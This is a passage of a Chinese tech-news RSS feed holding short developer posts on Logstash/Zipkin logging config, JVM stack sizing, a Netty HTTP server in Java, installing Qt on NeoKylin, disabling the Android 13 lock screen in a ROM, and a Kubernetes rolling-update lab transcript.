--&gt;&lt;encoder&gt;&lt;pattern&gt;${CONSOLE_LOG_PATTERN}&lt;/pattern&gt;&lt;charset&gt;utf8&lt;/charset&gt;&lt;/encoder&gt;&lt;/appender&gt;&lt;!-- logstash远程日志配置--&gt;&lt;appender name="logstash" class="net.logstash.logback.appender.LogstashTcpSocketAppender"&gt;&lt;destination&gt;192.168.222.128:4560&lt;/destination&gt;
&lt;encoderclass="net.logstash.logback.encoder.LoggingEventCompositeJsonEncoder"&gt;&lt;providers&gt;&lt;timestamp&gt;&lt;timeZone&gt;UTC&lt;/timeZone&gt;&lt;/timestamp&gt;&lt;pattern&gt;&lt;pattern&gt;{"severity": "%level","service": "${springAppName:-}","trace": "%X{X-B3-TraceId:-}","span": "%X{X-B3-SpanId:-}","exportable": "%X{X-Span-Export:-}","pid": "${PID:-}","thread": "%thread","class": "%logger{40}","rest": "%message"}&lt;/pattern&gt;&lt;/pattern&gt;&lt;/providers&gt;&lt;/encoder&gt;
&lt;/appender&gt;&lt;!-- 日志输出级别 --&gt;&lt;root level="DEBUG"&gt;&lt;appender-ref ref="console" /&gt;&lt;appender-ref ref="logstash" /&gt;&lt;/root&gt;
&lt;/configuration&gt;
六、Spring Cloud Zipkin
Zipkin和Sleuth集成，提供请求追踪，响应时间的可视化界面
-1)创建docker容器运行Zipkin服务器
0)依赖坐标
&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-zipkin&lt;/artifactId&gt;
&lt;/dependency&gt;
1）需要删除logback.xml
2)访问
http://192.168.222.128:9411/zipkin：</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540151.html</guid><pubDate>Fri, 31 Oct 2025 07:26:11 +0000</pubDate></item><item><title>【jvm】分配的栈内存越大越好吗</title><link>https://www.ppmy.cn/news/1540152.html</link><description>目录
1. 说明
2. 线程数量与栈内存的关系
3. 内存使用效率
4.应用程序的特性
5. JVM的配置参数
6. 性能考虑
1. 说明
1.在java虚拟机（jvm）中，栈内存是用于存储线程的方法调用和局部变量等信息的内存区域。
2.栈内存的大小配置，不是越大越好，需要根据应用程序的特性和需求来进行合理的配置。
2. 线程数量与栈内存的关系
1.每个线程在创建时都会分配一定的栈内存。如果栈内存设置得过大，在有限的物理内存下，JVM能够创建的线程数量就会减少。
2.对于需要大量线程的开发应用程序，过大的栈内存可能会导致线程创建失败，进而影响应用程序的性能。
3. 内存使用效率
1.栈内存的大小应该与线程的实际需求相匹配，如果栈内存设置得过大，而线程实际使用的栈空间远远小于这个值，就会造成内存浪费。
2.如果栈内存设置得过小，线程在运行时可能会因为栈溢出（StackOverflowError）而崩溃。
4.应用程序的特性
1.对于递归调用深度较大的应用程序，可能需要更大的栈内存来避免栈溢出。
2.对于局部变量使用较少，递归调用深度较浅的应用程序，过大的栈内存是不必要的。
5. JVM的配置参数
1.JVM提供了-Xss参数来设置每个线程的栈内存大小。通过调整这个参数，可以根据应用程序的需求来优化栈内存的配置。
6. 性能考虑
1.栈内存的大小对应用程序的性能也有一定影响。过大的栈内存可能会导致垃圾回收更加频繁，因为jvm在回收线程栈时会检查栈上的对象引用。
2.过大的栈内存也可能增加CPU的缓存压力，因为更多的内存区域需要被缓存。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540152.html</guid><pubDate>Fri, 31 Oct 2025 07:26:14 +0000</pubDate></item><item><title>内嵌服务器Netty Http Server</title><link>https://www.ppmy.cn/news/1540153.html</link><description>内嵌式服务器不需要我们单独部署，列如SpringBoot默认内嵌服务器Tomcat,它运行在服务内部。使用Netty 编写一个 Http 服务器的程序，类似SpringMvc处理http请求那样。举例：xxl-job项目的核心包没有SpringMvc的Controller层，客户端却可以发送http请求，好奇怪！！！其实xxl-job-core 内部使用Netty做了HttpServer。
package com.xxl.job.executor.test.dto;import lombok.Getter;
import lombok.Setter;/*** User: ldj* Date: 2024/10/11* Time: 11:23* Description: No Description*/
@Getter
@Setter
public class RequestDTO&lt;T&gt; {/*** 请求ur*/private String uri;/*** 请求参数*/private T param;
}
package com.xxl.job.executor.test.netty;import com.xxl.job.executor.test.handler.NettyHttpServerHandler;
import io.netty.bootstrap.ServerBootstrap;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioServerSocketChannel;
import io.netty.handler.codec.http.HttpObjectAggregator;
import io.netty.handler.codec.http.HttpServerCodec;
import io.netty.handler.timeout.IdleStateHandler;import java.util.concurrent.TimeUnit;/*** User: ldj* Date: 2024/10/11* Time: 10:57* Description: Netty Http服务*/
public class NettyHttpServer {public static void main(String[] args) {// 服务端口int port = 9990;// 接收请求线程池EventLoopGroup bossGroup = new NioEventLoopGroup();// 处理请求线程池EventLoopGroup workerGroup = new NioEventLoopGroup();try {ServerBootstrap bootstrap = new ServerBootstrap();bootstrap.group(bossGroup, workerGroup).channel(NioServerSocketChannel.class).childOption(ChannelOption.SO_KEEPALIVE, true).childHandler(new ChannelInitializer&lt;SocketChannel&gt;() {@Overridepublic void initChannel(SocketChannel channel) throws Exception {channel.pipeline().addLast(new IdleStateHandler(0, 0, 30 * 3, TimeUnit.SECONDS)).addLast(new HttpServerCodec()).addLast(new HttpObjectAggregator(5 * 1024 * 1024)).addLast(new NettyHttpServerHandler(new BaseService())); // 自定义handler}});// bind 绑定端口，启动服务ChannelFuture future = bootstrap.bind(port).sync();System.out.println("remote server started!");future.channel().closeFuture().sync();} catch (Exception e) {e.printStackTrace();} finally {try {// 关闭 EventLoopGroupworkerGroup.shutdownGracefully();bossGroup.shutdownGracefully();} catch (Exception e) {System.out.println(e.getMessage() + e);}}}
}
package com.xxl.job.executor.test.netty;/*** User: ldj* Date: 2024/10/11* Time: 12:55* Description: No Description*/
public class BaseService {public String test(String param) {return "netty http test--&gt; " + param;}
}
package com.xxl.job.executor.test.handler;import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.xxl.job.executor.test.dto.RequestDTO;
import com.xxl.job.executor.test.netty.BaseService;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.SimpleChannelInboundHandler;
import io.netty.handler.codec.http.*;
import io.netty.util.concurrent.DefaultThreadFactory;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Map;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;/*** User: ldj* Date: 2024/10/11* Time: 11:11* Description: 处理请求逻辑*/
public class NettyHttpServerHandler extends SimpleChannelInboundHandler&lt;FullHttpRequest&gt; {private static final Logger logger = LoggerFactory.getLogger(NettyHttpServerHandler.class);private BaseService baseService;public NettyHttpServerHandler(BaseService baseService) {this.baseService = baseService;}private static ThreadPoolExecutor executor = new ThreadPoolExecutor(200,300,5,TimeUnit.SECONDS,new LinkedBlockingQueue&lt;&gt;(2000),new DefaultThreadFactory("netty-http-server"),new ThreadPoolExecutor.AbortPolicy());@Overrideprotected void channelRead0(ChannelHandlerContext channelHandlerContext, FullHttpRequest fullHttpRequest) throws Exception {RequestDTO&lt;String&gt; requestDTO = parseReqParam(fullHttpRequest);executor.execute(() -&gt; {String response = getResponse(requestDTO);boolean keepAlive = HttpUtil.isKeepAlive(fullHttpRequest);writeToClient(channelHandlerContext, keepAlive, response);});}private void writeToClient(ChannelHandlerContext channel, boolean keepAlive, String response) {ByteBuf byteBuf = Unpooled.copiedBuffer(response, StandardCharsets.UTF_8);DefaultFullHttpResponse fullHttpResponse = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK,byteBuf);HttpHeaders headers = fullHttpResponse.headers();headers.set(HttpHeaderNames.CONTENT_TYPE,HttpHeaderValues.TEXT_HTML);headers.set(HttpHeaderNames.CONTENT_LENGTH,fullHttpResponse.content().readableBytes());if(keepAlive){headers.set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);}channel.writeAndFlush(fullHttpResponse);}private String getResponse(RequestDTO&lt;String&gt; requestDTO) {String uri = requestDTO.getUri();String param = requestDTO.getParam();try {// 硬编码！更好的做法可参考SpringMvc的解析注解的value放进一个Map&lt;url,Method&gt;switch (uri){case "/test":return baseService.test(param);default:return "请求路径不存在！";}} catch (Exception e) {e.printStackTrace();return e.getMessage();}}private RequestDTO&lt;String&gt; parseReqParam(FullHttpRequest fullHttpRequest) throws JsonProcessingException {String uri = fullHttpRequest.uri();String param = null;logger.info("有参数uri:{}", uri);HttpMethod method = fullHttpRequest.method();if (HttpMethod.GET.equals(method)) {QueryStringDecoder decoder = new QueryStringDecoder(uri);Map&lt;String, List&lt;String&gt;&gt; parameters = decoder.parameters();param = new ObjectMapper().writerWithDefaultPrettyPrinter().writeValueAsString(parameters);logger.info("parameters -&gt; {}", param);uri = decoder.rawPath();logger.info("不带参数uri:{}", uri);}if (HttpMethod.POST.equals(method)) {String contentTypeValue = fullHttpRequest.headers().getAsString(HttpHeaderNames.CONTENT_TYPE);if(contentTypeValue.contains(HttpHeaderValues.APPLICATION_JSON.toString())){param = fullHttpRequest.content().toString(StandardCharsets.UTF_8);}}RequestDTO&lt;String&gt; reqData = new RequestDTO&lt;&gt;();reqData.setUri(uri);reqData.setParam(param);return reqData;}
}</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540153.html</guid><pubDate>Fri, 31 Oct 2025 07:26:15 +0000</pubDate></item><item><title>智慧园区能带来哪些便利？</title><link>https://www.ppmy.cn/news/1540154.html</link><description>所谓智慧园区，是指通过信息化手段，实现园区内各项业务的数字化和智能化管理。园区管理者可以利用智能化平台实时监控各项运营情况，如能源使用、安全监控和物流运输等，及时调整管理策略，提高运营效率。智慧园区利用大数据和云计算等先进技术，实现园区内各类资源的优化配置。
其中涵盖了云建宝和一系列智慧工地相关设备，云建宝平台作为一个集成化的管理工具，提供了项目管理、人员管理、设备管理、安全监控等功能的全方位服务。通过云计算、大数据等技术，实现了工地信息的实时采集与分析，提高了管理效率与决策精准度。智慧工地相关设备则包括环境监测仪、视频监控系统等，这些设备能够实时监测工地环境与安全状况，有效预防安全隐患，并提升工地的整体安全管理水平。
智慧园区的发展也标志着现代城市的科技进步，它为园区内的工人带来了很多实在的便利，未来，智慧园区会为推动城市发展中做出更大贡献。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540154.html</guid><pubDate>Fri, 31 Oct 2025 07:26:17 +0000</pubDate></item><item><title>安卓13禁止锁屏 关闭锁屏 android13禁止锁屏 关闭锁屏</title><link>https://www.ppmy.cn/news/1540155.html</link><description>总纲
android13 rom 开发总纲说明
文章目录
1.前言
2.问题分析
3.代码分析
4.代码修改
5.彩蛋
1.前言
设置 =》安全 =》屏幕锁定 =》 无。 我们通过修改系统屏幕锁定配置，来达到设置屏幕不锁屏的配置。像网上好多文章都只写了在哪里改，改什么东西，但是实际上并未写明为什么要改那个地方，怎么来的。这个文章描述了，怎么处理类似的问题。
2.问题分析
我们进入设置 =》安全 =》屏幕锁定 =》 无，这里就可以设置系统屏幕锁定配置。有了这个操作思路，我们通过分析相关的代码设置，来达到我们的目的。
3.代码分析
我们搜索 “无”或者"滑动"，定位代码
./packages/apps/Settings/res/values-zh-rCN/strings.xml:785:    &lt;string name="unlock_set_unlock_mod</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540155.html</guid><pubDate>Fri, 31 Oct 2025 07:26:19 +0000</pubDate></item><item><title>中标麒麟v5安装qt512.12开发软件</title><link>https://www.ppmy.cn/news/1540156.html</link><description>注意 需要联网操作
遇到问题1：yum提示没有可用软件包问题 终端执行如下命令
CentOS7将yum源更换为国内源保姆级教程
中标麒麟V7-yum源的更换（阿里云源）
wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo
sed -i 's/$releasever/7/g' /etc/yum.repos.d/CentOS-Base.repo
yum clean all
yum makecache
sudo yum update （sudo yum update --skip-broken）
安装qt
sudo chmod -X qt-opensource-linux-x64-5.12.12.run
./qt-opensource-linux-x64-5.12.12.run
中标麒麟6安装Qt 4.8.4+QtCreator 2.7.0 NeoKylin Linux Desktop Release 6+Qt4.8.4+QtCreator2.7.0
中标麒麟7.0安装QT 5.12.4见招拆招
中标麒麟V7安装Qt5.13.0
遇到问题2：安装qt提示缺少G++
1、查看gcc版本
2、离线安装对应版本的gcc-c++
安装包下载链接：
https://vault.centos.org/6.5/os/x86_64/Packages/#
https://github.com/gcc-mirror/gcc/archive/refs/tags/releases/gcc-4.8.5.tar.gz
gcc4.8.5版本安装，gcc版本升级
Tags · gcc-mirror/gcc · GitHub
rpm -ivh gcc-c++-4.8.5-44.el7.x86_64.rpm --nodeps --force
遇到问题3：安装qt提示缺少libbus
1、如果离线安装，请下载如下安装包
安装包下载链接：
https://dbus.freedesktop.org/releases/dbus/
dbus-1.10.24-15.el7.x86_64.rpm
2、如果在线安装，请执行如下命令
yum install dbus.x86_64 --skip-broken
遇到问题4：安装qt提示FT_Get_Font_Format
1、如果离线安装，请下载如下安装包
安装包下载链接：
Index of /releases/freetype/
freetype-2.8-14.el7_9.1.x86_64.rpm
2、如果在线安装，请执行如下命令
yum install freetype
遇到问题5：运行qt项目报错
/opt/Qt5.12.12/5.12.12/gcc_64/include/QtCore/qglobal.h:45: error: type_traits: No such file or directory
In file included from /opt/Qt5.12.12/5.12.12/gcc_64/include/QtGui/qtguiglobal.h:43:0,
from /opt/Qt5.12.12/5.12.12/gcc_64/include/QtWidgets/qtwidgetsglobal.h:43,
from /opt/Qt5.12.12/5.12.12/gcc_64/include/QtWidgets/qmainwindow.h:43,
from /opt/Qt5.12.12/5.12.12/gcc_64/include/QtWidgets/QMainWindow:1,
from ../untitled/mainwindow.h:4,
from ../untitled/mainwindow.cpp:1:
/opt/Qt5.12.12/5.12.12/gcc_64/include/QtCore/qglobal.h:45:25: fatal error: type_traits: No such file or directory
#  include &lt;type_traits&gt;
1、如果在线安装，请执行如下命令
sudo yum install libGL --skip-broken
sudo yum install libGL-devel
sudo yum install libGLU-devel
sudo yum install freeglut
sudo yum install libstdc++
sudo yum install cmake
vim ~/.bashrc</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540156.html</guid><pubDate>Fri, 31 Oct 2025 07:26:22 +0000</pubDate></item><item><title>Linux——pod实验练习</title><link>https://www.ppmy.cn/news/1540157.html</link><description>练习：
创建一个deployment资源
名为test-nginx
使用nginx：1.19.1版本镜像
设置pod 标签为 app=frontend
设置副本数量为3
创建一个service 将上面的服务暴露给客户端访问
基于nginx:1.19.1构建一个新的镜像。镜像名为mynginx:new_files
base镜像为nginx:1.19.1
更新本地的index.html 文件到镜像的/usr/share/nginx/html 目录下
本地index.html文件的内容为“update on 10-8”
镜像名为mynginx:new_files
如果使用docker build进行构建，注意将镜像同步到每一个工作节点上
更新test-nginx的镜像为上一步构建的mynginx:new-files
访问pod所运行的nginx服务时，获得响应为update on 10-8
结合日志，观察pod的调度和访问，重点观察滚动更新的过程
[root@control ~]# source  .kube/k8s_bash_completion
[root@control ~]# cp nginx-deployment.yml test-nginx.yml
[root@control ~]# vim test-nginx.yml
apiVersion: apps/v1
kind: Deployment
metadata:name: test-nginx
spec:selector:matchLabels:app: frontendreplicas: 3template:metadata:labels:app: frontendspec:containers:- name: test-nginximage: nginx:1.19.1imagePullPolicy: IfNotPresentports:- containerPort: 80[root@control ~]# kubectl apply -f test-nginx.yml
deployment.apps/test-nginx created
[root@control ~]# kubectl get pods
NAME                         READY   STATUS    RESTARTS   AGE
test-nginx-779c87479-phtjz   1/1     Running   0          31s
test-nginx-779c87479-pssrj   1/1     Running   0          31s
test-nginx-779c87479-xs2dg   1/1     Running   0          31s
[root@control ~]# kubectl get deployments.apps
NAME         READY   UP-TO-DATE   AVAILABLE   AGE
test-nginx   3/3     3            3           57s
[root@control ~]# kubectl expose deployment test-nginx
service/test-nginx exposed
[root@control ~]# kubectl get svc
NAME         TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE
kubernetes   ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP   11d
test-nginx   ClusterIP   10.106.82.252   &lt;none&gt;        80/TCP    33s
[root@control ~]# curl 10.106.82.252
[root@control ~]# kubectl get pods
NAME                         READY   STATUS    RESTARTS   AGE
test-nginx-779c87479-phtjz   1/1     Running   0          5m2s
test-nginx-779c87479-pssrj   1/1     Running   0          5m2s
test-nginx-779c87479-xs2dg   1/1     Running   0          5m2s
[root@control ~]# curl 10.106.82.252  // 使用svc 对应的集群IP进行服务访问
……省略输出，多尝试几次 观察service对于pod的负载均衡实现
[root@control ~]# mkdir nginx-build
[root@control ~]# cd nginx-build/
[root@control nginx-build]# ls
[root@control nginx-build]# echo "update on 10-8" &gt;&gt; index.html
[root@control nginx-build]# vim Dockerfile
[root@control nginx-build]# systemctl start docker
# base镜像包括容器启动命令，故Dockerfile未规定，一个镜像必须包括一个容器启动命令
[root@control nginx-build]# docker image history nginx:1.19.1
IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT
08393e824c32   4 years ago   /bin/sh -c #(nop)  CMD ["nginx" "-g" "daemon…   0B
&lt;missing&gt;      4 years ago   /bin/sh -c #(nop)  STOPSIGNAL SIGTERM           0B
&lt;missing&gt;      4 years ago   /bin/sh -c #(nop)  EXPOSE 80                    0B
&lt;missing&gt;      4 years ago   /bin/sh -c #(nop)  ENTRYPOINT ["/docker-entr…   0B
&lt;missing&gt;      4 years ago   /bin/sh -c #(nop) COPY file:0fd5fca330dcd6a7…   1.04kB
&lt;missing&gt;      4 years ago   /bin/sh -c #(nop) COPY file:1d0a4127e78a26c1…   1.96kB
&lt;missing&gt;      4 years ago   /bin/sh -c #(nop) COPY file:e7e183879c35719c…   1.2kB
&lt;missing&gt;      4 years ago   /bin/sh -c set -x     &amp;&amp; addgroup --system -…   63.3MB
&lt;missing&gt;      4 years ago   /bin/sh -c #(nop)  ENV PKG_RELEASE=1~buster     0B
&lt;missing&gt;      4 years ago   /bin/sh -c #(nop)  ENV NJS_VERSION=0.4.2        0B
&lt;missing&gt;      4 years ago   /bin/sh -c #(nop)  ENV NGINX_VERSION=1.19.1     0B
&lt;missing&gt;      4 years ago   /bin/sh -c #(nop)  LABEL maintainer=NGINX Do…   0B
&lt;missing&gt;      4 years ago   /bin/sh -c #(nop)  CMD ["bash"]                 0B
&lt;missing&gt;      4 years ago   /bin/sh -c #(nop) ADD file:3af3091e7d2bb40bc…   69.2MB
[root@control nginx-build]# docker build -t mynginx:new_files .
…… 省略构建过程
[root@control nginx-build]# docker builder prune --all  // 清理构建缓存
[root@control nginx-build]#
[root@control nginx-build]# docker images
REPOSITORY                     TAG               IMAGE ID       CREATED         SIZE
mynginx                        new_files         2a1e46ec2739   15 hours ago    132MB
mydomain.com/myproject/nginx   newfile           9239b8beee8f   15 hours ago    132MB
python                         latest            ea2ebd905ab2   4 weeks ago     1.01GB
flannel/flannel                v0.25.6           f7b837852a09   6 weeks ago     75.1MB
flannel/flannel-cni-plugin     v1.5.1-flannel2   962fd97b50f9   6 weeks ago     10.6MB
nginx                          latest            39286ab8a5e1   7 weeks ago     188MB
busybox                        latest            6fd955f66c23   16 months ago   4.26MB
perl                           5.34.0            3677b00a7898   2 years ago     890MB
nginx                          1.19.1            08393e824c32   4 years ago     132MB
polinux/stress                 latest            df58d15b053d   4 years ago     9.74MB
quay.io/rnoushi/busyboxplus    curl              71fa7369f437   10 years ago    4.23MB
[root@control nginx-build]#
[root@control nginx-build]# docker save -o mynginx.tar mynginx:new_files
[root@control nginx-build]# scp mynginx.tar root@node1:/root
root@node1's password:
mynginx.tar                                                                                                                               100%  130MB  42.9MB/s   00:03
[root@control nginx-build]# scp mynginx.tar root@node2:/root
root@node2's password:
mynginx.tar                                                                                                                               100%  130MB  43.0MB/s   00:03node1 node2 操作：
[root@node2 ~]#  ctr -n k8s.io image import mynginx.tar
unpacking docker.io/library/mynginx:new_files (sha256:6d19cbee0500563f69a21adf165d3e15d032b1a8eb9f64669bd2c5307240e7a5)...done[root@node1 ~]# ctr -n k8s.io image import mynginx.tar
unpacking docker.io/library/mynginx:new_files (sha256:6d19cbee0500563f69a21adf165d3e15d032b1a8eb9f64669bd2c5307240e7a5)...done[root@control nginx-build]# kubectl set image deployments test-nginx test-nginx=nginx:1245  
//通过命令行更新deployment，这里设置的是一个错误镜像
deployment.apps/test-nginx image updated
[root@control nginx-build]# kubectl get deployments.apps  // 滚动更新已经开始
NAME         READY   UP-TO-DATE   AVAILABLE   AGE
test-nginx   3/3     1            3           22m
[root@control nginx-build]# kubectl rollout status deployment test-nginx
Waiting for deployment "test-nginx" rollout to finish: 1 out of 3 new replicas have been updated...
^C[root@control nginx-build]#
[root@control nginx-build]# kubectl events | tail -5   //错误原因查看
29s                   Warning   Failed                    Pod/test-nginx-5f79f967ff-skb54         Failed to pull image "nginx:1245": failed to pull and unpack image "docker.io/library/nginx:1245": failed to resolve reference "docker.io/library/nginx:1245": failed to do request: Head "https://registry-1.docker.io/v2/library/nginx/manifests/1245": dial tcp 69.63.184.14:443: connect: connection refused
29s (x2 over 69s)     Warning   Failed                    Pod/test-nginx-5f79f967ff-skb54         Error: ErrImagePull
16s (x2 over 68s)     Warning   Failed                    Pod/test-nginx-5f79f967ff-skb54         Error: ImagePullBackOff
16s (x2 over 68s)     Normal    BackOff                   Pod/test-nginx-5f79f967ff-skb54         Back-off pulling image "nginx:1245"
4s (x3 over 95s)      Normal    Pulling                   Pod/test-nginx-5f79f967ff-skb54         Pulling image "nginx:1245"
[root@control nginx-build]# kubectl rollout undo deployment test-nginx   // 撤销更新
deployment.apps/test-nginx rolled back
[root@control nginx-build]# kubectl events | tail -5
19s (x3 over 111s)    Warning   Failed                    Pod/test-nginx-5f79f967ff-skb54         Error: ErrImagePull
6s (x3 over 110s)     Warning   Failed                    Pod/test-nginx-5f79f967ff-skb54         Error: ImagePullBackOff
6s (x3 over 110s)     Normal    BackOff                   Pod/test-nginx-5f79f967ff-skb54         Back-off pulling image "nginx:1245"
3s                    Normal    SuccessfulDelete          ReplicaSet/test-nginx-5f79f967ff        Deleted pod: test-nginx-5f79f967ff-skb54
3s                    Normal    ScalingReplicaSet         Deployment/test-nginx                   Scaled down replica set test-nginx-5f79f967ff to 0 from 1
[root@control nginx-build]# kubectl get deployments.apps
NAME         READY   UP-TO-DATE   AVAILABLE   AGE
test-nginx   3/3     3            3           24m
[root@control nginx-build]# cd
[root@control ~]# vim test-nginx.yml
[root@control ~]# cat test-nginx.yml
apiVersion: apps/v1
kind: Deployment
metadata:name: test-nginx
spec:selector:matchLabels:app: frontendreplicas: 3template:metadata:labels:app: frontendspec:containers:- name: test-nginximage: mynginx:new_filesimagePullPolicy: IfNotPresentports:- containerPort: 80
[root@control ~]# kubectl apply -f test-nginx.yml   // 实施更新
deployment.apps/test-nginx configured
[root@control ~]# kubectl rollout status deployment test-nginx   //查看滚动更新过程
deployment "test-nginx" successfully rolled out
[root@control ~]# kubectl events | tail -30     //结合日志观察滚动更新的完整过程
2m15s (x3 over 3m59s)   Warning   Failed                    Pod/test-nginx-5f79f967ff-skb54         Error: ImagePullBackOff
2m12s                   Normal    ScalingReplicaSet         Deployment/test-nginx                   Scaled down replica set test-nginx-5f79f967ff to 0 from 1
2m12s                   Normal    SuccessfulDelete          ReplicaSet/test-nginx-5f79f967ff        Deleted pod: test-nginx-5f79f967ff-skb54
43s                     Normal    ScalingReplicaSet         Deployment/test-nginx                   Scaled up replica set test-nginx-bb78867bf to 1
43s                     Normal    Scheduled                 Pod/test-nginx-bb78867bf-fgd5l          Successfully assigned default/test-nginx-bb78867bf-fgd5l to node1
43s                     Normal    SuccessfulCreate          ReplicaSet/test-nginx-bb78867bf         Created pod: test-nginx-bb78867bf-fgd5l
43s                     Normal    Created                   Pod/test-nginx-bb78867bf-fgd5l          Created container test-nginx
43s                     Normal    Pulled                    Pod/test-nginx-bb78867bf-fgd5l          Container image "mynginx:new_files" already present on machine
42s                     Normal    Scheduled                 Pod/test-nginx-bb78867bf-7drv4          Successfully assigned default/test-nginx-bb78867bf-7drv4 to node2
42s                     Normal    SuccessfulCreate          ReplicaSet/test-nginx-bb78867bf         Created pod: test-nginx-bb78867bf-7drv4
42s                     Normal    ScalingReplicaSet         Deployment/test-nginx                   Scaled up replica set test-nginx-bb78867bf to 2 from 1
42s                     Normal    Started                   Pod/test-nginx-bb78867bf-fgd5l          Started container test-nginx
42s                     Normal    ScalingReplicaSet         Deployment/test-nginx                   Scaled down replica set test-nginx-779c87479 to 2 from 3
42s                     Normal    Killing                   Pod/test-nginx-779c87479-pssrj          Stopping container test-nginx
42s                     Normal    SuccessfulDelete          ReplicaSet/test-nginx-779c87479         Deleted pod: test-nginx-779c87479-pssrj
41s                     Normal    Created                   Pod/test-nginx-bb78867bf-7drv4          Created container test-nginx
41s                     Normal    Pulled                    Pod/test-nginx-bb78867bf-7drv4          Container image "mynginx:new_files" already present on machine
41s                     Normal    Started                   Pod/test-nginx-bb78867bf-7drv4          Started container test-nginx
40s                     Normal    Scheduled                 Pod/test-nginx-bb78867bf-gzd9v          Successfully assigned default/test-nginx-bb78867bf-gzd9v to node1
40s                     Normal    SuccessfulDelete          ReplicaSet/test-nginx-779c87479         Deleted pod: test-nginx-779c87479-phtjz
40s                     Normal    SuccessfulCreate          ReplicaSet/test-nginx-bb78867bf         Created pod: test-nginx-bb78867bf-gzd9v
40s                     Normal    Created                   Pod/test-nginx-bb78867bf-gzd9v          Created container test-nginx
40s                     Normal    Killing                   Pod/test-nginx-779c87479-phtjz          Stopping container test-nginx
40s                     Normal    Pulled                    Pod/test-nginx-bb78867bf-gzd9v          Container image "mynginx:new_files" already present on machine
40s                     Normal    ScalingReplicaSet         Deployment/test-nginx                   Scaled down replica set test-nginx-779c87479 to 1 from 2
40s                     Normal    ScalingReplicaSet         Deployment/test-nginx                   Scaled up replica set test-nginx-bb78867bf to 3 from 2
39s                     Normal    Started                   Pod/test-nginx-bb78867bf-gzd9v          Started container test-nginx
39s                     Normal    Killing                   Pod/test-nginx-779c87479-xs2dg          Stopping container test-nginx
39s                     Normal    SuccessfulDelete          ReplicaSet/test-nginx-779c87479         Deleted pod: test-nginx-779c87479-xs2dg
39s                     Normal    ScalingReplicaSet         Deployment/test-nginx                   Scaled down replica set test-nginx-779c87479 to 0 from 1
[root@control ~]# kubectl get svc test-nginx
NAME         TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE
test-nginx   ClusterIP   10.106.82.252   &lt;none&gt;        80/TCP    25m
[root@control ~]# curl 10.106.82.252
update on 10-8
[root@control ~]# curl 10.106.82.252
update on 10-8
[root@control ~]# curl 10.106.82.252
update on 10-8
[root@control ~]# curl 10.106.82.252
update on 10-8
[root@control ~]# curl 10.106.82.252
update on 10-8
[root@control ~]# curl 10.106.82.252
update on 10-8
[root@control ~]# kubectl edit svc test-nginx
service/test-nginx edited
修改第28行的type值为NodePort
[root@control ~]# kubectl get svc test-nginx
NAME         TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE
test-nginx   NodePort   10.106.82.252   &lt;none&gt;        80:31567/TCP   28m
[root@control ~]# curl http:///192.168.110.10:31567
update on 10-8
[root@control ~]# curl http:///192.168.110.10:31567
update on 10-8
[root@control ~]# curl http:///192.168.110.10:31567
update on 10-8
[root@control ~]# kubectl run testbox --image=quay.io/rnoushi/busyboxplus:curl -i -t --rm=true
If you don't see a command prompt, try pressing enter.
[ root@testbox:/ ]$ nslookup test-nginx
Server:    10.96.0.10
Address 1: 10.96.0.10 kube-dns.kube-system.svc.cluster.localName:      test-nginx
Address 1: 10.106.82.252 test-nginx.default.svc.cluster.local
[ root@testbox:/ ]$ curl test-nginx.default.svc.cluster.local
update on 10-8
[ root@testbox:/ ]$ curl test-nginx.default.svc.cluster.local
update on 10-8
[ root@testbox:/ ]$ curl test-nginx.default.svc.cluster.local^C
[ root@testbox:/ ]$ exit
Session ended, resume using 'kubectl attach testbox -c testbox -i -t' command when the pod is running
pod "testbox" deleted
[root@control ~]# kubectl get svc -A
NAMESPACE     NAME             TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)                  AGE
default       kubernetes       ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP                  11d
default       test-nginx       NodePort    10.106.82.252   &lt;none&gt;        80:31567/TCP             33m
kube-system   kube-dns         ClusterIP   10.96.0.10      &lt;none&gt;        53/UDP,53/TCP,9153/TCP   18d
kube-system   metrics-server   ClusterIP   10.101.56.59    &lt;none&gt;        443/TCP                  15d
[root@control ~]# kubectl describe svc kuber-dns -n kube-system -o yaml
error: unknown shorthand flag: 'o' in -o
See 'kubectl describe --help' for usage.
[root@control ~]# kubectl describe svc kuber-dns -n kube-system
Error from server (NotFound): services "kuber-dns" not found
[root@control ~]# kubectl describe svc kube-dns -n kube-system
Name:                     kube-dns
Namespace:                kube-system
Labels:                   k8s-app=kube-dnskubernetes.io/cluster-service=truekubernetes.io/name=CoreDNS
Annotations:              prometheus.io/port: 9153prometheus.io/scrape: true
Selector:                 k8s-app=kube-dns
Type:                     ClusterIP
IP Family Policy:         SingleStack
IP Families:              IPv4
IP:                       10.96.0.10
IPs:                      10.96.0.10
Port:                     dns  53/UDP
TargetPort:               53/UDP
Endpoints:                10.244.2.95:53,10.244.0.5:53
Port:                     dns-tcp  53/TCP
TargetPort:               53/TCP
Endpoints:                10.244.2.95:53,10.244.0.5:53
